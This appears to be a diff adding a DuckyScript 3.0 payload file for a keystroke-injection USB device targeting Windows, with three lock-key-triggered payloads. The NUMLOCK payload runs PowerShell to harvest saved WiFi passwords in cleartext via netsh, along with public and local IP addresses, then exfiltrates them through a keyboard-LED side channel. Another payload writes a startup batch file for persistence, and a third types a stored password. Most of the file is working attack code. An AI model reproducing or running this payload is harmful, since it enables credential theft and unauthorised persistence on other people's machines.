@@ -1,0 +1,176 @@
+REM Three Payloads from LOCK Key Double Press.
+REM Author: RootJunky
+REM COMPATABILITY: Windows
+REM DuckyScript 3.0
+
+REM set password
+DEFINE PASS mypassword
+
+REM Stop and Start the while loop during payload execution with VAR 1 and 2.
+VAR $stopstart = 1
+
+REM SCROLLLOCK Payload
+FUNCTION FUN1()
+    $stopstart = 2
+    WAIT_FOR_SCROLL_CHANGE
+    DELAY 1000
+    STRING PASS
+    ENTER
+    LED_R
+    DELAY 1000
+    LED_OFF
+    $stopstart = 1
+END_FUNCTION
+
+REM NUMLOCK Payload
+FUNCTION FUN2()
+    $stopstart = 2
+    WAIT_FOR_NUM_CHANGE
+    DELAY 500
+    GUI r
+    DELAY 1000
+    STRING Powershell
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    ENTER
+    STRING $PublicIP = "Your-Public-IP-Address"
+    ENTER
+    STRING $LocalIP = "Your-Local-IP-Address"
+    ENTER
+    STRING $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+    ENTER
+    STRING $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
+    ENTER
+    STRING $Wifi = (netsh wlan show profiles) | Select-String ":(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | % {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+    ENTER
+    STRING $Wifi + $PublicIP + $computerPubIP + $LocalIP + $Networks.ipaddress[0] > $env:tmp\z
+    ENTER
+    STRING clear
+    ENTER
+    SAVE_HOST_KEYBOARD_LOCK_STATE
+    STRING $Wifi + $PublicIP + $computerPubIP + $LocalIP + $Networks.ipaddress[0] + (echo "Press NUMLOCK now to EXFIL this data, you have 5 seconds.")
+    ENTER
+    STRING timeout 5
+    ENTER
+    DELAY 6000
+    STRING EXIT
+        REM This only runs if NUMLOCK is press in the 5 second window. 
+        IF $_NUMLOCK_ON THEN
+            $_EXFIL_MODE_ENABLED = TRUE
+            $_EXFIL_LEDS_ENABLED = TRUE
+        
+            REM Convert the stored credentials into CAPSLOCK and NUMLOCK values.
+            GUI r
+            DELAY 100
+            STRING powershell "foreach($b in $(cat $env:tmp\z -En by)){foreach($a in 0x80,
+            STRING 0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else
+            STRING {$o+='%{CAPSLOCK}'}}};$o+='%{SCROLLLOCK}';echo $o >$env:tmp\z"
+            ENTER
+            DELAY 100
+        
+            REM Use powershell to inject the CAPSLOCK and NUMLOCK values to the Ducky.
+            GUI r
+            DELAY 100
+            STRING powershell "$o=(cat $env:tmp\z);Add-Type -A System.Windows.Forms;
+            STRING [System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\z"
+            ENTER
+            DELAY 100
+        
+            REM The final SCROLLLOCK value will be sent to indicate that EXFIL is complete.
+            WAIT_FOR_SCROLL_CHANGE
+            LED_G
+            $_EXFIL_MODE_ENABLED = FALSE
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_IF
+    LED_R
+    DELAY 1000
+    LED_OFF
+    $stopstart = 1
+END_FUNCTION
+
+REM Capslock payload
+FUNCTION FUN3()
+    $stopstart = 2
+    WAIT_FOR_CAPS_CHANGE
+    DELAY 500
+    GUI r
+    DELAY 500
+    STRING cmd
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING ECHO echo off > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO mode con:cols=30 lines=10 >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO start https://youtu.be/sXwaRjU7Tj0?t=57 >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO exit >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING exit
+    ENTER
+    LED_R
+    DELAY 1000
+    LED_OFF
+    $stopstart = 1
+END_FUNCTION
+
+REM place all lock keys in the off state to start the payload correctly. 
+FUNCTION SETUP()
+SAVE_HOST_KEYBOARD_LOCK_STATE
+DELAY 500
+IF ( $_NUMLOCK_ON == TRUE ) THEN
+    NUMLOCK
+    DELAY 500
+END_IF
+IF ( $_SCROLLLOCK_ON == TRUE ) THEN
+    SCROLLLOCK
+    DELAY 500
+END_IF
+IF ( $_CAPSLOCK_ON == TRUE ) THEN
+    CAPSLOCK
+    DELAY 500
+END_IF
+END_FUNCTION
+
+REM SCROLLLOCK on to enable button description on ducky startup. 
+SAVE_HOST_KEYBOARD_LOCK_STATE
+DELAY 1000
+IF ( $_SCROLLLOCK_ON == TRUE ) THEN
+    DELAY 500
+    GUI r 
+    DELAY 1000
+    STRING powershell
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING $groups = ('CAPSLOCK = RickRoll','SCROLLLOCK = Password','NUMLOCK = WiFi Password and EXFIL','Double press any of these keys to run the payloads.')
+    ENTER
+    STRING $groups = $groups -join "`n- "
+    ENTER
+    STRING powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('- $groups','DUCKY USAGE')}"
+    ENTER
+    SETUP()
+        ELSE IF
+    SETUP()
+END_IF
+
+REM Constantly monitor scrolllock, numlock, and capslock keys with a while loop. 
+WHILE ( $stopstart == 1 )
+    REM Call FUNCTION 1 with scrolllock press.
+    IF ($_SCROLLLOCK_ON == TRUE) THEN
+    FUN1()
+        REM Call FUNCTION 2 with numlock press.
+        ELSE IF ($_NUMLOCK_ON == TRUE) THEN
+        FUN2()
+            REM Call FUNCTION 3 with capslock press.
+            ELSE IF ($_CAPSLOCK_ON == TRUE) THEN
+            FUN3()
+    END_IF
+END_WHILE
